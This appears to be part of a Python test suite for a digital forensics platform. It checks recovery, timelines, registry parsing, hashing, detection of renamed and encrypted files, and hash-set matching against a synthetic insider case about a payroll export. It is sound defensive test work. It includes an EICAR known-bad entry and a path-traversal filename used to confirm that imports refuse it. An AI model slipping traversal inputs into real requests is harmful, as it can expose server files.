    rec = post(f"/api/forensics/evidence/{E}/recover?inode={item.get('data_inode')}&offset={item.get('partition_offset')}", inv).json or {}
    check('Recycle Bin: the $R content is present and recovers to the payroll export, byte for byte',
          item.get('data_present') is True and item.get('data_path') == f'{RECYCLE_DIR}/$R3K9D2A.csv'
          and rec.get('sha256') == hashlib.sha256(PAYROLL).hexdigest(), rec)

    tl = get(f'/api/forensics/timeline?case_id={A}&type=PROGRAM_RUN,RECENT_FILE_OPENED,FILE_DELETED_TO_RECYCLE_BIN&order=asc&limit=100', inv).json['data']
    got = [(e['type'], iso(e['timestamp'])) for e in tl]
    want = [('PROGRAM_RUN', utc(2026, 9, 1, 10, 6, 2)), ('RECENT_FILE_OPENED', utc(2026, 9, 1, 14, 14, 6)),
            ('FILE_DELETED_TO_RECYCLE_BIN', utc(2026, 9, 1, 14, 15, 20)), ('PROGRAM_RUN', utc(2026, 9, 1, 14, 18, 30))]
    check('timeline: program runs, file opened from E: and the deletion, at their true times and in order', got == want, got)
    check('search filter finds SecureDelete and nothing for an unknown name',
          act('PROGRAM_RUN', '&search=securedelete').json['total'] == 1 and act('PROGRAM_RUN', '&search=nosuchprogram').json['total'] == 0)
    check('an invalid kind is 400', act('BROWSER_HISTORY').status == 400)
    check('another investigator gets 404', get(f'/api/forensics/activity?case_id={A}', C['INV2']).status == 404)


ALICE_SID = 'S-1-5-21-3623811015-3361044348-30300820-1001'
FILETIME_EPOCH = datetime(1601, 1, 1, tzinfo=timezone.utc)


def _fat_time(iso_utc):
    """FAT keeps modification times to 2 seconds: the time as stored on the disk."""
    t = datetime.fromisoformat(iso_utc)
    return t - timedelta(seconds=t.second % 2, microseconds=t.microsecond)


def _hive(path):
    """A hive from the image (icat) opened with libregf, independent of DFIP's regipy-based parsers."""
    import pyregf
    files = {e['path']: e for e in C['TRUTH']}
    local = Path(tempfile.mkdtemp()) / path.rsplit('/', 1)[-1]
    data = sh('icat', '-o', '2048', str(IMG), files[path]['inode']).stdout
    local.write_bytes(data)
    f = pyregf.file()
    f.open(str(local))
    return f, hashlib.sha256(data).hexdigest()


def _regval(f, key, name):
    v = f.get_key_by_path(key).get_value_by_name(name)
    t = v.get_type()
    if t in (1, 2):
        return v.get_data_as_string()
    if t == 4:
        return v.get_data_as_integer()
    return v.get_data()


@section('12c Computer, users and time zone (vs the hives read with libregf and the generator manifest)')
def t_computer():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    db = mongo()
    tz = get(f'/api/evidence/{E}', inv).json.get('time_zone') or {}
    check("the computer's time zone is read from the SYSTEM hive (Eastern Standard Time -> America/New_York)",
          tz.get('source') == 'registry' and tz.get('zone') == COMPUTER_TZ and (tz.get('detected') or {}).get('key_name') == 'Eastern Standard Time', tz)

    # Every file time equals the UTC time the generator stamped, in daylight and in standard time alike.
    manifest = json.loads(IMG.with_suffix('.manifest.json').read_text())
    stored = {x['path']: x for x in db.fs_entries.find({'evidence_id': E, 'container': {'$exists': False}},
                                                       {'path': 1, 'mtime': 1, 'time_zone': 1, 'atime_date_only': 1})}
    wrong = [(f['path'], str((stored.get(f['path']) or {}).get('mtime')), f['mtime']) for f in manifest['files']
             if f['path'] not in stored or stored[f['path']]['mtime'] != _fat_time(f['mtime'])]
    check(f"every file time on the FAT volume equals the true UTC time ({len(manifest['files'])} files)", not wrong, wrong[:5])
    for path, when in (('/Users/alice/Documents/q1-forecast.txt', utc(2026, 1, 15, 15, 30)),
                       ('/Users/alice/Documents/year-end-checklist.txt', utc(2025, 11, 2, 14, 0)),
                       ('/Users/alice/Documents/payroll-export.csv', utc(2026, 9, 1, 9, 41, 2))):
        check(f"{path.rsplit('/', 1)[-1]}: {when:%Y-%m-%d %H:%M} UTC ({'EST, UTC-5' if when.month in (1, 11) else 'EDT, UTC-4'})",
              (stored.get(path) or {}).get('mtime') == when, (stored.get(path) or {}).get('mtime'))
    fat = [x for x in stored.values()]
    check('FAT entries carry the time zone used and flag access times as date-only',
          fat and all(x.get('time_zone') == COMPUTER_TZ and x.get('atime_date_only') for x in fat), fat[:1])

    # The computer, against the hives read independently.
    system, system_sha = _hive('/Windows/System32/config/SYSTEM')
    software, software_sha = _hive('/Windows/System32/config/SOFTWARE')
    sam, sam_sha = _hive('/Windows/System32/config/SAM')
    entry = next((x for x in get(f'/api/forensics/computer?case_id={A}', inv).json['data'] if x['evidence_id'] == E), {})
    comp = entry.get('computer') or {}
    shutdown = FILETIME_EPOCH + timedelta(microseconds=struct.unpack('<Q', _regval(system, r'\ControlSet001\Control\Windows', 'ShutdownTime'))[0] // 10)
    install = datetime.fromtimestamp(_regval(software, r'\Microsoft\Windows NT\CurrentVersion', 'InstallDate'), timezone.utc)
    check('computer name, last shutdown and network interface equal the SYSTEM hive',
          comp.get('computer_name') == _regval(system, r'\ControlSet001\Control\ComputerName\ComputerName', 'ComputerName') == 'LAPTOP-07'
          and iso(comp.get('last_shutdown')) == shutdown == utc(2026, 9, 1, 18, 42, 10)
          and [i['ip'] for i in comp.get('interfaces', [])] == ['192.168.1.57'], {k: comp.get(k) for k in ('computer_name', 'last_shutdown', 'interfaces')})
    os_ = comp.get('os') or {}
    check('Windows edition, version, build, install date and owner equal the SOFTWARE hive',
          os_.get('product_name') == _regval(software, r'\Microsoft\Windows NT\CurrentVersion', 'ProductName') == 'Windows 10 Pro'
          and os_.get('display_version') == '22H2' and os_.get('build') == '19045' and iso(os_.get('install_date')) == install
          and os_.get('registered_owner') == 'alice', os_)
    check('the hives the results come from are listed with their SHA-256',
          {h['hive']: h['sha256'] for h in comp.get('hives', [])} == {'SYSTEM': system_sha, 'SOFTWARE': software_sha, 'SAM': sam_sha},
          comp.get('hives'))
    names = sorted(k.get_name() for k in sam.get_key_by_path(r'\SAM\Domains\Account\Users\Names').sub_keys)
    accounts = {a['username']: a for a in entry.get('accounts', [])}
    check('every SAM user is listed', sorted(accounts) == names, (sorted(accounts), names))
    alice = accounts.get('alice', {})
    check("alice: SID, full name, last logon, logon count and profile folder",
          alice.get('sid') == ALICE_SID and alice.get('full_name') == 'Alice Example' and iso(alice.get('last_logon')) == utc(2026, 9, 1, 13, 28, 40)
          and alice.get('logon_count') == 214 and alice.get('profile_path') == 'C:\\Users\\alice' and alice.get('disabled') is False, alice)
    check('built-in accounts are reported disabled', all(accounts[n]['disabled'] for n in ('Administrator', 'Guest', 'DefaultAccount')),
          {n: accounts.get(n, {}).get('disabled') for n in ('Administrator', 'Guest', 'DefaultAccount')})
    rb = get(f'/api/forensics/activity?case_id={A}&kind=RECYCLE_BIN_ITEM', inv).json['data']
    check('the Recycle Bin item names its user (SID resolved to alice)', rb and rb[0].get('user_name') == 'alice' and rb[0].get('sid') == ALICE_SID, rb[:1])
    check('keyword search finds the account', (get(f'/api/forensics/search?case_id={A}&q=Alice+Example', inv).json or {}).get('totals', {}).get('accounts') == 1)
    check('the overview counts the user accounts', get(f'/api/cases/{A}/overview', inv).json['counts'].get('user_accounts') == len(names))
    check('a viewer of the case can read it; another investigator gets 404',
          get(f'/api/forensics/computer?case_id={C["V_CASE"]}', C['VIEWER']).status == 200
          and get(f'/api/forensics/computer?case_id={A}', C['INV2']).status == 404)

    # Setting the time zone by hand (and going back to the registry's).
    path = f'/api/evidence/{E}/time-zone'
    check('viewer and analyst cannot set the time zone (403); another investigator gets 404',
          req('PUT', path, C['VIEWER'], {'zone': 'UTC', 'reason': 'not allowed'}).status == 403
          and req('PUT', path, C['INV2'], {'zone': 'UTC', 'reason': 'not my case'}).status == 404)
    check('an unknown zone is refused (400) and a reason is required (422)',
          req('PUT', path, inv, {'zone': 'Mars/Olympus', 'reason': 'a test zone'}).status == 400
          and req('PUT', path, inv, {'zone': 'UTC'}).status == 422)
    pay = next(x for x in get(f'/api/forensics/evidence/{E}/files?deleted=true&q=payroll-export.csv', inv).json['data'])
    macb = next(x for x in get(f'/api/forensics/timeline?case_id={A}&limit=500&q=payroll-export.csv', inv).json['data']
                if x['type'] == 'FILE_MACB' and 'm' in x.get('macb', ''))
    tags = [post('/api/tags', inv, {'case_id': A, 'item_type': t, 'item_id': i, 'label': 'NOTABLE', 'note': 'time zone check'}).json
            for t, i in (('FILE', pay['_id']), ('TIMELINE_EVENT', macb['_id']))]
    r = req('PUT', path, inv, {'zone': 'UTC', 'reason': 'Read the FAT times as recorded'})
    j = wait_job(inv, r.json['job_id']) if r.status == 200 else {}
    after = db.fs_entries.find_one({'evidence_id': E, 'path': '/Users/alice/Documents/payroll-export.csv'})
    tz = get(f'/api/evidence/{E}', inv).json.get('time_zone') or {}
    check('setting the time zone re-indexes with it (FAT times as recorded: 05:41:02 = local time read as UTC)',
          j.get('status') == 'COMPLETED' and j['result']['summary']['plan'] == ['tz_probe'] + AFTER_FS_INDEX
          and after['mtime'] == utc(2026, 9, 1, 5, 41, 2) and tz.get('source') == 'override' and tz.get('zone') == 'UTC', (j.get('status'), after.get('mtime'), tz.get('source')))
    check('...and tags still follow their items after the times changed', j.get('result', {}).get('summary', {}).get('tags') == {'relinked': 2, 'unresolved': 0},
          j.get('result', {}).get('summary', {}).get('tags'))
    r = req('PUT', path, inv, {'zone': None, 'reason': 'Back to the time zone in the SYSTEM hive'})
    j = wait_job(inv, r.json['job_id']) if r.status == 200 else {}
    after = db.fs_entries.find_one({'evidence_id': E, 'path': '/Users/alice/Documents/payroll-export.csv'})
    check('clearing it goes back to the registry time zone', j.get('status') == 'COMPLETED' and after['mtime'] == utc(2026, 9, 1, 9, 41, 2)
          and (get(f'/api/evidence/{E}', inv).json.get('time_zone') or {}).get('source') == 'registry', after.get('mtime'))
    audit = [a['action'] for a in db.audit_logs.find({'action': {'$in': ['TIME_ZONE_SET', 'TIME_ZONE_CLEARED']}})]
    check('both changes are in the audit log', audit.count('TIME_ZONE_SET') >= 1 and audit.count('TIME_ZONE_CLEARED') >= 1, audit)
    for t in tags:
        req('DELETE', f"/api/tags/{t['tag_id']}", inv)
    # Later sections use the payroll entry's database ID: the re-analysis replaced it.
    C['PAY'] = next(x for x in get(f'/api/forensics/evidence/{E}/files?deleted=true&q=payroll-export.csv', inv).json['data'])


def form(method, path, token, fields, filename=None, data=None):
    """A multipart/form-data request: text fields and at most one file."""
    b = uuid.uuid4().hex
    parts = [f'--{b}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode() for k, v in fields.items()]
    if filename is not None:
        parts += [f'--{b}\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                  f'Content-Type: application/octet-stream\r\n\r\n'.encode(), data, b'\r\n']
    return req(method, path, token, raw=b''.join(parts) + f'--{b}--\r\n'.encode(), ctype=f'multipart/form-data; boundary={b}')


def icat_bytes(path):
    e = next(x for x in C['TRUTH'] if x['path'] == path and not x['virtual'])
    return sh('icat', '-o', '2048', str(IMG), e['inode']).stdout


def _wait_jobs(token, ids):
    return [wait_job(token, j) for j in ids]


# What the generator hid on the disk (make_artifacts.hidden_files), and what each file must be flagged as.
RENAMED = {'/Users/alice/Pictures/holiday.jpg': 'JPEG image', '/Users/alice/Downloads/eicar.com': 'executable program'}
ENCRYPTED = {'/Users/alice/Documents/private.zip': 'ZIP', '/Users/alice/Documents/salary-review.docx': 'OFFICE',
             '/Users/alice/Documents/vault.dat': 'HIGH_ENTROPY'}
OOXML_OR_ODF = ('application/vnd.openxmlformats-officedocument.', 'application/vnd.oasis.opendocument.', 'application/epub+zip')


@section('12d File hashes, types, encryption and hash sets (vs icat + hashlib, the file command and the manifest)')
def t_fileproc():
    inv, A, E, admin = C['INVESTIGATOR'], C['A'], C['E'], C['ADMIN']
    db = mongo()
    stored = {(x['path'], x['inode']): x for x in db.fs_entries.find({'evidence_id': E, 'is_virtual': False, 'is_dir': False})}
    files = [e for e in C['TRUTH'] if not e['virtual'] and e['mode'].startswith('r')]

    # Hashes and types, every file (deleted ones too), against icat + hashlib and the file command.
    bad_hash, bad_type, refined = [], [], []
    with tempfile.TemporaryDirectory() as tmp:
        for e in files:
            data = sh('icat', '-o', '2048', str(IMG), e['inode']).stdout
            x = stored.get((e['path'], e['inode'])) or {}
            if (x.get('md5'), x.get('sha1'), x.get('sha256')) != (hashlib.md5(data).hexdigest(), hashlib.sha1(data).hexdigest(), hashlib.sha256(data).hexdigest()):
                bad_hash.append(e['path'])
            p = Path(tmp) / 'f'
            p.write_bytes(data)
            truth = sh('file', '-b', '--mime-type', str(p)).stdout.decode().strip()
            if x.get('mime') != truth:
                # The file command reports OOXML/ODF documents as ZIP when they lack its marker members: finer is fine.
                if truth == 'application/zip' and (x.get('mime') or '').startswith(OOXML_OR_ODF):
                    refined.append(e['path'])
                else:
                    bad_type.append((e['path'], x.get('mime'), truth))
    check(f'MD5, SHA-1 and SHA-256 of all {len(files)} files (deleted ones included) equal hashlib over icat', files and not bad_hash, bad_hash[:5])
    check('every file type equals the file command run on the extracted file', not bad_type, bad_type[:5])
    if refined:
        note('types refined beyond the file command (ZIP-based documents)', refined)
    deleted = [x for x in stored.values() if x.get('deleted')]
    check('deleted files are hashed as their content is on the disk now (labelled)',
          deleted and all(x.get('hash_basis', '').startswith('deleted') and x.get('sha256') for x in deleted), [x.get('hash_basis') for x in deleted])
    manifest = {f['path']: f for f in json.loads(IMG.with_suffix('.manifest.json').read_text())['files']}
    by_path = {x['path']: x for x in stored.values()}
    check('every generated file has the SHA-256 the generator recorded',
          all(by_path.get(p, {}).get('sha256') == f['sha256'] for p, f in manifest.items()),
          [p for p, f in manifest.items() if by_path.get(p, {}).get('sha256') != f['sha256']][:5])

    # Names that hide the content, and encryption.
    renamed = {x['path']: x.get('expected_type') for x in stored.values() if x.get('ext_mismatch')}
    check('exactly the renamed files are flagged, with what their name suggests (holiday.jpg is the payroll CSV, eicar.com is text)',
          renamed == RENAMED and by_path['/Users/alice/Pictures/holiday.jpg']['mime'] == 'text/csv'
          and by_path['/Users/alice/Pictures/holiday.jpg']['sha256'] == hashlib.sha256(PAYROLL).hexdigest(), renamed)
    enc = {x['path']: (x.get('encryption') or {}).get('kind') for x in stored.values() if x.get('encryption')}
    check('exactly the encrypted files are flagged: AES ZIP, password-protected Word document, random-data container',
          enc == ENCRYPTED and 'AES' in by_path['/Users/alice/Documents/private.zip']['encryption']['detail']
          and by_path['/Users/alice/Documents/vault.dat']['entropy'] > 7.99, enc)
    pz = by_path['/Users/alice/Documents/private.zip']
    check('private.zip is typed as a ZIP archive although libmagic cannot tell from its first bytes',
          pz['mime'] == 'application/zip' and pz['file_category'] == 'archive', (pz.get('mime'), pz.get('file_category')))
    zp = subprocess.run(['python3', '-c', 'import zipfile,sys,io; z=zipfile.ZipFile(io.BytesIO(sys.stdin.buffer.read()));'
                         'print(",".join(f"{i.filename}:{i.flag_bits & 1}:{i.compress_type}" for i in z.infolist()))'],
                        input=icat_bytes('/Users/alice/Documents/private.zip'), capture_output=True, timeout=60).stdout.decode().strip()
    check('...and its entry is really encrypted with AES (zipfile: flag bit 0, method 99)', zp == 'payroll-export.csv:1:99', zp)
    ole = subprocess.run(['python3', '-c', 'import olefile,sys,io; o=olefile.OleFileIO(io.BytesIO(sys.stdin.buffer.read()));'
                          'print(",".join(sorted("/".join(s) for s in o.listdir())))'],
                         input=icat_bytes('/Users/alice/Documents/salary-review.docx'), capture_output=True, timeout=60).stdout.decode()
    check('...and salary-review.docx really is an encrypted package (EncryptionInfo + EncryptedPackage streams)',
          'EncryptedPackage' in ole and 'EncryptionInfo' in ole, ole[:200])
    cats = {x['path']: x.get('file_category') for x in stored.values()}
    check('file categories: script, image, document, database, registry, shortcut',
          cats.get('/Users/alice/Downloads/cleanup.ps1') == 'script' and cats.get('/Users/alice/Pictures/whiteboard.png') == 'image'
          and cats.get('/Users/alice/Documents/offer-letter.pdf') == 'document'
          and cats.get('/Users/alice/AppData/Local/Google/Chrome/User Data/Default/History') == 'database'
          and cats.get('/Windows/System32/config/SYSTEM') == 'registry'
          and cats.get('/Users/alice/AppData/Roaming/Microsoft/Windows/Recent/payroll-export.csv.lnk') == 'shortcut', cats)
    counts = get(f'/api/evidence/{E}', inv).json['modules']['fileproc']['counts']
    check('the module counts hashed, renamed and encrypted files', counts == {'files_hashed': len(files), 'files_unreadable': 0,
                                                                             'renamed_files': len(RENAMED), 'encrypted_files': len(ENCRYPTED)}, counts)

    # The Files page filters, and finding the same content anywhere in the case.
    fl = lambda qs: get(f'/api/forensics/evidence/{E}/files?limit=1000&{qs}', inv).json
    check('files can be filtered by category, renamed and encrypted',
          {x['path'] for x in fl('category=archive')['data']} == {'/Users/alice/Documents/private.zip', '/Users/alice/Documents/export-backup.zip'}
          and {x['path'] for x in fl('renamed=true')['data']} == set(RENAMED)
          and {x['path'] for x in fl('encrypted=true')['data']} == set(ENCRYPTED)
          and fl('encrypted=false')['total'] == fl('')['total'] - len(ENCRYPTED))
    pay_sha = hashlib.sha256(PAYROLL).hexdigest()
    same = get(f'/api/forensics/hash?case_id={A}&digest={pay_sha.upper()}', inv).json
    want = {'/Users/alice/Pictures/holiday.jpg', '/Users/alice/Documents/payroll-export.csv',
            '/$Recycle.Bin/S-1-5-21-3623811015-3361044348-30300820-1001/$R3K9D2A.csv', EMAILED_PAYROLL}
    check('the payroll content is found under every name: the renamed copy, the Recycle Bin copy, the deleted original, the copy emailed home '
          'and the recovered file',
          {x['path'] for x in same['files']} == want and any(a['type'] == 'RECOVERED_FILE' for a in same['artifacts']), same)
    md5 = get(f'/api/forensics/hash?case_id={A}&digest={hashlib.md5(PAYROLL).hexdigest()}', inv).json
    check('...also by MD5', md5['algorithm'] == 'md5' and {x['path'] for x in md5['files']} == want, md5.get('files'))
    check('a value that is not a hash is refused (400); another investigator gets 404',
          get(f'/api/forensics/hash?case_id={A}&digest=xyz', inv).status == 400
          and get(f'/api/forensics/hash?case_id={A}&digest={pay_sha}', C['INV2']).status == 404)
    s = get(f'/api/forensics/search?case_id={A}&q={pay_sha}', inv).json
    check('keyword search with a SHA-256 finds the files', s['totals'].get('files') == len(want), s['totals'])
    check('flagged lists: renamed and encrypted', {x['path'] for x in get(f'/api/forensics/flagged?case_id={A}&kind=renamed', inv).json['data']} == set(RENAMED)
          and get(f'/api/forensics/flagged?case_id={A}&kind=encrypted', inv).json['total'] == len(ENCRYPTED)
          and get(f'/api/forensics/flagged?case_id={A}&kind=other', inv).status == 400)
    mal = list(db.forensic_artifacts.find({'evidence_id': E, 'type': 'MALWARE_INDICATOR'}))
    check('YARA now picks files by their real type and still matches only cleanup.ps1',
          [m.get('original_path') or m.get('path') for m in mal] == ['/Users/alice/Downloads/cleanup.ps1'] and mal[0].get('file_category') == 'script',
          [(m.get('original_path'), m.get('rule')) for m in mal])

    # Hash sets: administrators import, everyone can see.
    eicar_sha = by_path['/Users/alice/Downloads/eicar.com']['sha256']
    check('an investigator cannot import a hash set (403)',
          form('POST', '/api/hashsets', inv, {'name': 'Mine', 'kind': 'KNOWN_BAD'}, 'x.txt', eicar_sha.encode()).status == 403)
    check('a bad kind or an empty file is refused (400)',
          form('POST', '/api/hashsets', admin, {'name': 'Bad kind', 'kind': 'EVIL'}, 'x.txt', eicar_sha.encode()).status == 400
          and form('POST', '/api/hashsets', admin, {'name': 'Empty', 'kind': 'KNOWN_BAD'}, 'x.txt', b'').status == 400)
    good_sha1 = {p: hashlib.sha1(icat_bytes(p)).hexdigest() for p in ('/Users/alice/Documents/project-notes.txt',
                                                                       '/Users/alice/Pictures/whiteboard.png', '/Users/alice/Documents/offer-letter.pdf')}
    sets = {}
    # Known bad: a plain list (sha256sum output) with a comment and a line that is not a hash.
    bad_list = f'# demo known-bad list\n{eicar_sha}  eicar.com\nnot-a-hash\n'.encode()
    r = form('POST', '/api/hashsets', admin, {'name': 'Demo known-bad', 'kind': 'KNOWN_BAD', 'description': 'EICAR test file'}, 'bad.txt', bad_list)
    sets['bad'] = r.json or {}
    # Notable: CSV with an MD5 column (the payroll export).
    notable_csv = f'FileName,MD5\npayroll-export.csv,{hashlib.md5(PAYROLL).hexdigest()}\n'.encode()
    sets['notable'] = form('POST', '/api/hashsets', admin, {'name': 'Payroll exports', 'kind': 'NOTABLE'}, 'notable.csv', notable_csv).json or {}
    # Known good: an NSRL RDS v3-style SQLite (SHA-1), placed on the server for an import by name. It also lists the
    # payroll export, so that file is both notable and known good: notable must win.
    incoming = Path('/app/storage/hashsets/incoming')
    incoming.mkdir(parents=True, exist_ok=True)
    nsrl = incoming / 'RDS_demo.db'
    nsrl.unlink(missing_ok=True)
    import sqlite3
    con = sqlite3.connect(nsrl)
    con.execute('CREATE TABLE FILE (sha256 TEXT, sha1 TEXT, md5 TEXT, file_name TEXT, file_size INTEGER, package_id INTEGER)')
    con.executemany('INSERT INTO FILE VALUES (NULL,?,NULL,?,0,1)', [(h.upper(), p.rsplit('/', 1)[-1]) for p, h in good_sha1.items()]
                    + [(hashlib.sha1(PAYROLL).hexdigest().upper(), 'payroll-export.csv')])
    con.commit()
    con.close()
    check('the server folder for large sets is listed for administrators only',
          any(f['filename'] == 'RDS_demo.db' for f in get('/api/hashsets/incoming', admin).json['data'])
          and get('/api/hashsets/incoming', inv).status == 403)
    check('import by name refuses folders and unknown files (400, 404)',
          post('/api/hashsets/import-local', admin, {'filename': '../RDS_demo.db', 'name': 'x', 'kind': 'KNOWN_GOOD'}).status == 400
          and post('/api/hashsets/import-local', admin, {'filename': 'missing.db', 'name': 'x', 'kind': 'KNOWN_GOOD'}).status == 404)
    sets['good'] = post('/api/hashsets/import-local', admin, {'filename': 'RDS_demo.db', 'name': 'Demo NSRL', 'kind': 'KNOWN_GOOD'}).json or {}
    imports = {k: wait_job(admin, v.get('job_id')) for k, v in sets.items()}
    check('the three imports complete', all(j.get('status') == 'COMPLETED' for j in imports.values()), {k: (j.get('status'), j.get('error')) for k, j in imports.items()})
    listed = {x['set_id']: x for x in get('/api/hashsets', C['VIEWER']).json['data']}
    hs = {k: listed.get(v.get('set_id'), {}) for k, v in sets.items()}
    check('sets are listed (to every user) with format, counts and invalid lines',
          (hs['bad'].get('format'), hs['bad'].get('counts', {}).get('sha256'), hs['bad'].get('invalid_lines')) == ('text', 1, 1)
          and (hs['notable'].get('format'), hs['notable'].get('counts', {}).get('md5')) == ('CSV', 1)
          and (hs['good'].get('format'), hs['good'].get('counts', {}).get('sha1')) == ('NSRL RDS v3 (SQLite)', 4)
          and all(h.get('status') == 'READY' for h in hs.values()) and hs['bad'].get('source_sha256') == hashlib.sha256(bad_list).hexdigest(),
          hs)
    check('the uploaded file is not kept once imported (the set store holds the hashes); a server-side file is left alone',
          not list(Path('/app/storage/hashsets/uploads').glob('*')) and nsrl.exists())
    rematch = [jid for j in imports.values() for jid in (j.get('result') or {}).get('rematch_jobs', [])]
    done = _wait_jobs(admin, rematch)
    check('each import re-matched the analysed evidence (only the hash-set module ran)',
          rematch and all(j.get('status') == 'COMPLETED' and j['result']['summary']['plan'] == ['hash_match'] for j in done),
          [(j.get('status'), (j.get('result') or {}).get('summary', {}).get('plan')) for j in done])
    _analyse(inv, E, {'modules': ['hash_match']})  # settle: the last re-match sees all three sets

    status = {x['path']: (x.get('hash_status'), [s['name'] for s in x.get('hash_sets') or []])
              for x in db.fs_entries.find({'evidence_id': E, 'hash_status': {'$exists': True, '$ne': None}})}
    check('eicar.com is known bad', status.get('/Users/alice/Downloads/eicar.com') == ('KNOWN_BAD', ['Demo known-bad']), status)
    check('every copy of the payroll export is notable, and notable outranks known good',
          all(status.get(p, (None,))[0] == 'NOTABLE' and status[p][1] == ['Payroll exports', 'Demo NSRL'] for p in want), {p: status.get(p) for p in want})
    check('the known-good files are known good', all(status.get(p, (None,))[0] == 'KNOWN_GOOD' for p in good_sha1), {p: status.get(p) for p in good_sha1})
    check('no other file matches a set', set(status) == set(want) | set(good_sha1) | {'/Users/alice/Downloads/eicar.com'}, sorted(status))
    total = fl('')['total']
    check('known-good files can be hidden; filtering by status works',
          fl('hide_known=true')['total'] == total - len(good_sha1) and fl('hash_status=KNOWN_BAD')['total'] == 1
          and {x['path'] for x in get(f'/api/forensics/flagged?case_id={A}&kind=notable', inv).json['data']} == want)
    hits = get(f'/api/forensics/artifacts?case_id={A}&artifact_type=HASH_SET_MATCH&limit=100', inv).json['data']
    check('known-bad and notable files become hash-set indicators (known good do not)',
          sorted((h['kind'], h['original_path']) for h in hits) == sorted([('KNOWN_BAD', '/Users/alice/Downloads/eicar.com')] + [('NOTABLE', p) for p in want]),
          [(h.get('kind'), h.get('original_path')) for h in hits])
    n = [x for x in get('/api/notifications', inv).json['data'] if x.get('title') == 'Known-bad files found']
    check("the case's investigator is told about the known-bad file", n and E in n[0]['message'], [x.get('title') for x in get('/api/notifications', inv).json['data'][:5]])
    ov = get(f'/api/cases/{A}/overview', inv).json['counts']
    check('the overview counts known-bad, notable, renamed and encrypted files',
          (ov.get('known_bad_files'), ov.get('notable_files'), ov.get('renamed_files'), ov.get('encrypted_files')) == (1, len(want), len(RENAMED), len(ENCRYPTED)), ov)
    C['HASHSETS'] = {k: v.get('set_id') for k, v in sets.items()}

    # Deleting a set.
    bad_id = sets['bad']['set_id']
    check('an investigator cannot delete a set (403)', req('DELETE', f'/api/hashsets/{bad_id}', inv).status == 403)
    db.hash_sets.update_one({'set_id': bad_id}, {'$set': {'status': 'IMPORTING'}})
    check('a set still importing cannot be deleted (409)', req('DELETE', f'/api/hashsets/{bad_id}', admin).status == 409)
    db.hash_sets.update_one({'set_id': bad_id}, {'$set': {'status': 'READY'}})
    d = req('DELETE', f'/api/hashsets/{bad_id}', admin)
    _wait_jobs(admin, (d.json or {}).get('rematch_jobs', []))
    eicar = db.fs_entries.find_one({'evidence_id': E, 'path': '/Users/alice/Downloads/eicar.com'})
    check('deleting a set removes its store and re-matches: eicar.com is no longer known bad',
          d.status == 200 and not eicar.get('hash_status') and not Path(f'/app/storage/hashsets/{bad_id}.sqlite').exists()
          and get(f'/api/forensics/flagged?case_id={A}&kind=known_bad', inv).json['total'] == 0, (d, eicar.get('hash_status')))
    audit = {a['action'] for a in db.audit_logs.find({'action': {'$in': ['HASHSET_IMPORTED', 'HASHSET_DELETED']}})}
    check('imports and deletions are in the audit log', audit == {'HASHSET_IMPORTED', 'HASHSET_DELETED'}, audit)
    check('an unknown set is 404', req('DELETE', '/api/hashsets/HS-9999', admin).status == 404)

    # Encrypted volumes (dfVFS samples): recognised, and reported as needing a key.
    # Independent markers: the BitLocker boot-sector signature, or the BitLocker To Go discovery-volume GUID at 0x1A8.
    to_go = uuid.UUID('4967d63b-2e29-4ad8-8399-f6a339e3d001').bytes_le
    for name, kind, truth in (('bdetogo.raw', 'BitLocker', lambda d: d[3:11] == b'-FVE-FS-' or d[0x1A8:0x1B8] == to_go),
                              ('luks1.raw', 'LUKS', lambda d: d[:6] == b'LUKS\xba\xbe')):
        p = sample('dfvfs', name)
        if not p:
            note(f'{kind} volume detection', 'dfVFS sample not downloaded; skipped')
            continue
        head = p.read_bytes()[:4096]
        q = post('/api/cases', inv, {'name': f'{kind} volume sample', 'priority': 'LOW'}).json['case_id']
        ev = upload(inv, q, p.read_bytes(), name.replace('.raw', '.dd')).json['evidence_id']
        j = _analyse(inv, ev, {'profile': 'quick'})
        s = (j.get('result') or {}).get('summary') or {}
        warned = [w for w in s.get('warnings', []) if kind in w and 'recovery key or password' in w]
        fact = (db.analysis_facts.find_one({'evidence_id': ev}) or {}).get('fs_index', {}).get('filesystems', [])
        check(f'{name}: the {kind} volume is recognised and reported as needing its key',
              truth(head) and j.get('status') == 'COMPLETED' and s.get('counts', {}).get('encrypted_volumes') == 1 and warned
              and [f.get('encryption') for f in fact] == [kind], (j.get('status'), s.get('counts'), s.get('warnings'), fact))
    if sample('dfvfs', 'luks1.raw'):
        fs = sh('fsstat', str(sample('dfvfs', 'luks1.raw'))).stdout.decode() + sh('fsstat', str(sample('dfvfs', 'luks1.raw'))).stderr.decode()
        check('the Sleuth Kit agrees the LUKS sample is encrypted', 'LUKS' in fs, fs[:200])


# What make_artifacts.content_files() planted (published test values), and what must not be reported.
CONTACTS_TXT = '/Users/alice/Documents/contacts.txt'
HANDOVER_DOCX = '/Users/alice/Documents/handover.docx'
RTF_NOTES = '/Users/alice/Documents/meeting-notes.rtf'
UTF16_NOTES = '/Users/alice/Documents/notes-utf16.txt'
BUDGET_ODT = '/Users/alice/Documents/budget.odt'
PAYROLL_COPIES = ('/Users/alice/Pictures/holiday.jpg', '/Users/alice/Documents/payroll-export.csv',
                  '/$Recycle.Bin/S-1-5-21-3623811015-3361044348-30300820-1001/$R3K9D2A.csv')


def _xml_text(data: bytes, member: str) -> str:
    """All text nodes of one XML member of a ZIP-based document (independent of DFIP's extractor)."""
    import io
    import xml.etree.ElementTree as ET
    import zipfile
    return ' '.join(t for t in ET.fromstring(zipfile.ZipFile(io.BytesIO(data)).read(member)).itertext() if t.strip())


@section('12e Content search and found data (vs icat bytes, pdftotext, the XML in the documents and the planted values)')
def t_content():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    db = mongo()
    j = _analyse(inv, E, {'modules': ['content', 'found_data']})
    s = (j.get('result') or {}).get('summary') or {}
    check('the content modules run on their own (file processing already done)',
          j.get('status') == 'COMPLETED' and s.get('plan') == ['content', 'found_data'], (j.get('status'), s.get('plan'), j.get('error')))
    index = (db.analysis_facts.find_one({'evidence_id': E}) or {}).get('content', {}).get('index', {})
    import sqlite3
    con = sqlite3.connect(f"file:{index.get('path')}?mode=ro", uri=True)
    docs = {row[0]: row[1:] for row in con.execute('SELECT path, method, encoding, bom FROM docs')}
    texts = {row[0]: row[1] for row in con.execute('SELECT d.path, b.text FROM docs d JOIN body b ON b.rowid = d.id')}
    con.close()
